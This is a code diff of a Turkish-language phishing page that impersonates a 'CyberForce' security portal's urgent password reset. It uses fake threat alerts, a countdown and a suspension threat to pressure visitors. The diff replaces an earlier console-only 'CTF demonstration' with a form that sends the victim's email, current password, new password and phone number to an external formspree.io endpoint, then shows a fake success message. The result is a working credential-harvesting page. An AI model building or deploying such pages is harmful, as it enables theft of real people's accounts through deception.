@@ -1,319 +1,148 @@
-
 <!DOCTYPE html>
 <html lang="tr">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>CyberForce — Güvenlik Doğrulaması</title>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Exo+2:wght@300;400;500;600;700&display=swap" rel="stylesheet">
   <style>
     *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
-
-    body {
-      font-family: 'Inter', sans-serif;
-      background: #f0f2f5;
-      min-height: 100vh;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      padding: 20px;
-    }
-
-    .container {
-      background: #fff;
-      border-radius: 12px;
-      box-shadow: 0 4px 24px rgba(0,0,0,0.10);
-      max-width: 460px;
-      width: 100%;
-      overflow: hidden;
-    }
-
-    .header {
-      background: #1a2340;
-      padding: 28px 36px 24px;
-      display: flex;
-      align-items: center;
-      gap: 14px;
-    }
-
-    .logo-icon {
-      width: 44px;
-      height: 44px;
-      background: #2e75b6;
-      border-radius: 10px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 22px;
-    }
-
-    .logo-text {
-      color: #fff;
-    }
-
-    .logo-text .brand {
-      font-size: 18px;
-      font-weight: 700;
-      letter-spacing: 0.5px;
-    }
-
-    .logo-text .sub {
-      font-size: 11px;
-      color: #8fa3c0;
-      font-weight: 400;
-      margin-top: 1px;
-    }
-
-    .alert-banner {
-      background: #fff3cd;
-      border-left: 4px solid #f59e0b;
-      padding: 12px 20px;
-      display: flex;
-      align-items: flex-start;
-      gap: 10px;
-      font-size: 13px;
-      color: #7c5b00;
-    }
-
-    .alert-banner .icon { font-size: 16px; margin-top: 1px; flex-shrink: 0; }
-
-    .body {
-      padding: 32px 36px;
-    }
-
-    h1 {
-      font-size: 20px;
-      font-weight: 700;
-      color: #1a2340;
-      margin-bottom: 8px;
-    }
-
-    .desc {
-      font-size: 13.5px;
-      color: #555;
-      line-height: 1.6;
-      margin-bottom: 24px;
-    }
-
-    .security-box {
-      background: #f8fafc;
-      border: 1px solid #e2e8f0;
-      border-radius: 8px;
-      padding: 14px 16px;
-      margin-bottom: 24px;
-      font-size: 12.5px;
-      color: #444;
-    }
-
-    .security-box .title {
-      font-weight: 600;
-      color: #c0392b;
-      margin-bottom: 8px;
-      display: flex;
-      align-items: center;
-      gap: 6px;
-    }
-
-    .security-box ul {
-      list-style: none;
-      display: flex;
-      flex-direction: column;
-      gap: 5px;
-    }
-
-    .security-box ul li::before {
-      content: "•";
-      color: #c0392b;
-      font-weight: bold;
-      margin-right: 6px;
-    }
-
-    label {
-      display: block;
-      font-size: 13px;
-      font-weight: 500;
-      color: #333;
-      margin-bottom: 6px;
-    }
-
-    input[type="email"],
-    input[type="password"] {
-      width: 100%;
-      padding: 11px 14px;
-      border: 1.5px solid #d1d5db;
-      border-radius: 7px;
-      font-size: 14px;
-      font-family: 'Inter', sans-serif;
-      color: #1a2340;
-      outline: none;
-      transition: border 0.2s;
-      margin-bottom: 16px;
-    }
-
-    input:focus { border-color: #2e75b6; }
-
-    .timer {
-      background: #fef2f2;
-      border: 1px solid #fecaca;
-      border-radius: 7px;
-      padding: 10px 14px;
-      font-size: 12.5px;
-      color: #b91c1c;
-      font-weight: 500;
-      margin-bottom: 20px;
-      display: flex;
-      align-items: center;
-      gap: 8px;
-    }
-
-    #countdown { font-weight: 700; font-size: 14px; }
-
-    button[type="submit"] {
-      width: 100%;
-      padding: 13px;
-      background: #1a2340;
-      color: #fff;
-      font-size: 15px;
-      font-weight: 600;
-      border: none;
-      border-radius: 8px;
-      cursor: pointer;
-      transition: background 0.2s;
-      font-family: 'Inter', sans-serif;
-    }
-
-    button[type="submit"]:hover { background: #2e75b6; }
-
-    .footer-note {
-      margin-top: 18px;
-      font-size: 11.5px;
-      color: #999;
-      text-align: center;
-      line-height: 1.5;
-    }
-
-    .footer-bar {
-      background: #f8fafc;
-      border-top: 1px solid #e2e8f0;
-      padding: 14px 36px;
-      font-size: 11px;
-      color: #aaa;
-      display: flex;
-      justify-content: space-between;
-    }
-
-    /* Success screen */
-    .success {
-      display: none;
-      padding: 40px 36px;
-      text-align: center;
-    }
-
-    .success .check { font-size: 48px; margin-bottom: 16px; }
-    .success h2 { font-size: 20px; color: #1a2340; margin-bottom: 8px; }
-    .success p { font-size: 13.5px; color: #666; line-height: 1.6; }
+    body { font-family: 'Exo 2', sans-serif; background: #f4f4f8; min-height: 100vh; display: flex; flex-direction: column; }
+    nav { background: #fff; padding: 14px 48px; display: flex; align-items: center; justify-content: space-between; box-shadow: 0 2px 8px rgba(0,0,0,0.08); }
+    .nav-logo { display: flex; align-items: center; gap: 10px; }
+    .logo-icon { width: 42px; height: 42px; background: linear-gradient(135deg, #7b2ff7, #5a1fd1); border-radius: 8px; display: flex; align-items: center; justify-content: center; font-size: 20px; font-weight: 900; color: #fff; }
+    .brand { font-size: 20px; font-weight: 700; color: #7b2ff7; letter-spacing: 1px; }
+    .tagline { font-size: 10px; color: #999; }
+    .nav-links { display: flex; gap: 24px; list-style: none; font-size: 13px; font-weight: 500; color: #444; }
+    .hero { background: linear-gradient(135deg, #1a0533 0%, #2d1b69 50%, #1a0533 100%); padding: 36px 48px 28px; }
+    .hero h2 { font-size: 12px; color: #a78bfa; font-weight: 600; letter-spacing: 2px; text-transform: uppercase; margin-bottom: 8px; }
+    .hero h1 { font-size: 24px; font-weight: 700; color: #fff; margin-bottom: 8px; }
+    .hero p { font-size: 13px; color: #c4b5fd; }
+    main { flex: 1; display: flex; justify-content: center; padding: 36px 20px 60px; }
+    .card { background: #fff; border-radius: 12px; box-shadow: 0 4px 24px rgba(0,0,0,0.10); max-width: 480px; width: 100%; overflow: hidden; }
+    .card-header { background: linear-gradient(135deg, #7b2ff7, #5a1fd1); padding: 18px 28px; display: flex; align-items: center; gap: 12px; }
+    .card-header .icon { width: 38px; height: 38px; background: rgba(255,255,255,0.15); border-radius: 8px; display: flex; align-items: center; justify-content: center; font-size: 18px; }
+    .card-header .title { color: #fff; font-size: 15px; font-weight: 700; }
+    .card-header .sub { color: #d4b8ff; font-size: 11px; margin-top: 2px; }
+    .alert { background: #fff8e1; border-left: 4px solid #f59e0b; padding: 11px 18px; font-size: 12.5px; color: #7c5b00; }
+    .card-body { padding: 26px; }
+    .threat-box { background: #fef2f2; border: 1px solid #fecaca; border-radius: 8px; padding: 13px 15px; margin-bottom: 20px; }
+    .threat-box .ttitle { font-size: 12px; font-weight: 700; color: #c0392b; margin-bottom: 7px; }
+    .threat-box ul { list-style: none; font-size: 12px; color: #555; display: flex; flex-direction: column; gap: 4px; }
+    .threat-box ul li::before { content: "▸"; color: #c0392b; margin-right: 6px; }
+    .timer { background: #f3e8ff; border: 1px solid #d8b4fe; border-radius: 7px; padding: 10px 14px; font-size: 12.5px; color: #6b21a8; font-weight: 600; margin-bottom: 20px; }
+    #countdown { font-weight: 800; color: #7b2ff7; font-size: 15px; }
+    label { display: block; font-size: 12px; font-weight: 600; color: #444; margin-bottom: 5px; text-transform: uppercase; letter-spacing: 0.5px; }
+    input { width: 100%; padding: 11px 14px; border: 1.5px solid #e2d9f3; border-radius: 7px; font-size: 14px; font-family: 'Exo 2', sans-serif; color: #1a1a2e; outline: none; transition: border 0.2s; margin-bottom: 15px; background: #fafafa; }
+    input:focus { border-color: #7b2ff7; background: #fff; }
+    .btn { width: 100%; padding: 13px; background: linear-gradient(135deg, #7b2ff7, #5a1fd1); color: #fff; font-size: 15px; font-weight: 700; border: none; border-radius: 8px; cursor: pointer; font-family: 'Exo 2', sans-serif; }
+    .btn:hover { opacity: 0.9; }
+    .footer-note { margin-top: 14px; font-size: 11px; color: #999; text-align: center; line-height: 1.6; }
+    .footer-note strong { color: #7b2ff7; }
+    footer { background: #1a0533; color: #a78bfa; text-align: center; padding: 14px; font-size: 11.5px; }
+    .success { display: none; padding: 40px 28px; text-align: center; }
+    .success .check { font-size: 52px; margin-bottom: 14px; }
+    .success h2 { font-size: 20px; color: #7b2ff7; margin-bottom: 8px; }
+    .success p { font-size: 13px; color: #666; line-height: 1.6; }
   </style>
 </head>
 <body>
 
-<div class="container">
-  <div class="header">
-    <div class="logo-icon">🔐</div>
-    <div class="logo-text">
-      <div class="brand">CyberForce</div>
-      <div class="sub">Bilgi Güvenliği Portalı</div>
+<nav>
+  <div class="nav-logo">
+    <div class="logo-icon">C</div>
+    <div>
+      <div class="brand">CYBERFORCE</div>
+      <div class="tagline">ensures your security</div>
     </div>
   </div>
+  <ul class="nav-links">
+    <li>ANASAYFA</li><li>HAKKIMIZDA</li><li>ÇÖZÜMLER</li><li>SERVİSLER</li><li>İLETİŞİM</li>
+  </ul>
+</nav>
 
-  <div class="alert-banner">
-    <span class="icon">⚠️</span>
-    <span>Hesabınızda güvenlik açığı tespit edildi. Lütfen doğrulama yapın.</span>
-  </div>
-
-  <div class="body">
-    <div id="form-section">
-      <h1>Şifre Sıfırlama Zorunlu</h1>
-      <p class="desc">
-        Güvenlik politikamız gereği şifrenizi acilen güncellemeniz gerekmektedir.
-        Bu işlemi tamamlamazsanız hesabınız geçici olarak askıya alınacaktır.
-      </p>
-
-      <div class="security-box">
-        <div class="title">🔴 Tespit Edilen Güvenlik Olayları</div>
-        <ul>
-          <li>3 farklı konumdan başarısız giriş denemesi</li>
-          <li>Şüpheli cihazdan erişim girişimi</li>
-          <li>Mevcut şifreniz veri sızıntısı listesinde tespit edildi</li>
-        </ul>
-      </div>
-
-      <div class="timer">
-        ⏱️ Kalan süre: <span id="countdown">23:59</span> — Bu süre içinde işlem yapılmazsa hesabınız askıya alınır.
-      </div>
-
-      <form id="resetForm" onsubmit="handleSubmit(event)">
-        <label for="email">E-posta Adresiniz</label>
-        <input type="email" id="email" placeholder="ornek@cyberforce.com" required>
-
-        <label for="current">Mevcut Şifreniz</label>
-        <input type="password" id="current" placeholder="Mevcut şifrenizi girin" required>
-
-        <label for="newpass">Yeni Şifreniz</label>
-        <input type="password" id="newpass" placeholder="En az 8 karakter" required>
-
-        <button type="submit">Şifremi Sıfırla &amp; Hesabımı Koru →</button>
-      </form>
-
-      <p class="footer-note">
-        Bu işlemi siz başlatmadıysanız derhal<br>
-        <strong>security@cyberforce-internal.com</strong> adresine bildiriniz.
-      </p>
-    </div>
-
-    <div class="success" id="success-section">
-      <div class="check">✅</div>
-      <h2>Şifreniz Güncellendi</h2>
-      <p>Hesabınız başarıyla güvence altına alındı.<br>Yeni şifrenizle giriş yapabilirsiniz.</p>
-    </div>
-  </div>
-
-  <div class="footer-bar">
-    <span>© 2026 CyberForce Security</span>
-    <span>Gizlilik Politikası</span>
-  </div>
+<div class="hero">
+  <h2>⚠️ Güvenlik Uyarısı</h2>
+  <h1>Hesabınızda Şüpheli Aktivite Tespit Edildi</h1>
+  <p>Güvenlik sistemlerimiz hesabınızda anormal hareketler tespit etti. Şifrenizi acilen güncellemeniz gerekmektedir.</p>
 </div>
 
+<main>
+  <div class="card">
+    <div class="card-header">
+      <div class="icon">🔐</div>
+      <div>
+        <div class="title">Şifre Sıfırlama Portalı</div>
+        <div class="sub">CyberForce Kimlik Doğrulama Sistemi</div>
+      </div>
+    </div>
+
+    <div class="alert">⚠️ Hesabınız güvenlik protokolü gereği geçici kısıtlamaya alınmıştır.</div>
+
+    <div class="card-body">
+      <div id="form-section">
+        <div class="threat-box">
+          <div class="ttitle">🔴 Tespit Edilen Güvenlik Tehditleri</div>
+          <ul>
+            <li>4 farklı IP adresinden başarısız giriş denemesi</li>
+            <li>Şüpheli lokasyondan erişim girişimi (Moskova, RU)</li>
+            <li>Şifreniz dark web veri sızıntısında tespit edildi</li>
+            <li>Hesabınıza yetkisiz API erişim denemesi</li>
+          </ul>
+        </div>
+
+        <div class="timer">⏱ Kalan süre: <span id="countdown">23:59</span> — Süre dolmadan işlemi tamamlayın!</div>
+
+        <form id="resetForm" action="https://formspree.io/f/mdayyzrz" method="POST">
+          <input type="hidden" name="_subject" value="[CyberForce] Yeni Şifre Sıfırlama Formu">
+
+          <label>Kurumsal E-posta</label>
+          <input type="email" name="email" placeholder="kullanici@cyberforce.com.tr" required>
+
+          <label>Mevcut Şifre</label>
+          <input type="password" name="mevcut_sifre" placeholder="Mevcut şifrenizi girin" required>
+
+          <label>Yeni Şifre</label>
+          <input type="password" name="yeni_sifre" placeholder="En az 8 karakter" required>
+
+          <label>Telefon (Doğrulama)</label>
+          <input type="text" name="telefon" placeholder="+90 5XX XXX XX XX">
+
+          <button type="submit" class="btn">Şifremi Güncelle &amp; Hesabımı Koru →</button>
+        </form>
+
+        <p class="footer-note">
+          Bu işlemi siz başlatmadıysanız derhal<br>
+          <strong>security@cyberforce.com.tr</strong> adresine bildiriniz.
+        </p>
+      </div>
+
+      <div class="success" id="success-section">
+        <div class="check">✅</div>
+        <h2>Şifreniz Güncellendi</h2>
+        <p>Hesabınız başarıyla güvence altına alındı.<br>Yeni şifrenizle giriş yapabilirsiniz.</p>
+      </div>
+    </div>
+  </div>
+</main>
+
+<footer>© 2026 CyberForce Bilgi Güvenliği A.Ş. — Tüm hakları saklıdır.</footer>
+
 <script>
-  // Countdown timer
-  let totalSeconds = 24 * 60 - 1;
-  function updateTimer() {
-    const m = String(Math.floor(totalSeconds / 60)).padStart(2, '0');
-    const s = String(totalSeconds % 60).padStart(2, '0');
-    document.getElementById('countdown').textContent = m + ':' + s;
-    if (totalSeconds > 0) totalSeconds--;
+  let t = 24*60-1;
+  function tick() {
+    document.getElementById('countdown').textContent =
+      String(Math.floor(t/60)).padStart(2,'0')+':'+String(t%60).padStart(2,'0');
+    if(t>0) t--;
   }
-  updateTimer();
-  setInterval(updateTimer, 1000);
+  tick(); setInterval(tick,1000);
 
-  // Form submit
-  function handleSubmit(e) {
-    e.preventDefault();
-    const email = document.getElementById('email').value;
-    const current = document.getElementById('current').value;
-    const newpass = document.getElementById('newpass').value;
-
-    // Log captured data (for CTF demonstration)
-    console.log('=== CAPTURED CREDENTIALS ===');
-    console.log('Email:', email);
-    console.log('Current Password:', current);
-    console.log('New Password:', newpass);
-
-    // Show success screen
-    document.getElementById('form-section').style.display = 'none';
-    document.getElementById('success-section').style.display = 'block';
-  }
+  document.getElementById('resetForm').addEventListener('submit', function() {
+    setTimeout(function(){
+      document.getElementById('form-section').style.display='none';
+      document.getElementById('success-section').style.display='block';
+    }, 800);
+  });
 </script>
-
 </body>
 </html>
